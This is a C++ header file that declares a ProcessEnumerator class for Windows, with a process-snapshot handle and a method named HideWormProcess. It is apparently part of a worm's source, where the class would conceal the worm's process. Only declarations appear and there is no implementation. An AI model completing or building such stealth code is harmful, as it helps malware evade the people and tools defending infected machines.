#ifndef PROCESSENUMERATOR_H
#define PROCESSENUMERATOR_H

#include <windows.h>
#include <tlhelp32.h>

class ProcessEnumerator {
public:
    ProcessEnumerator();
    ~ProcessEnumerator();

    void HideWormProcess();

private:
    HANDLE hProcessSnap;
};

#endif // PROCESSENUMERATOR_H
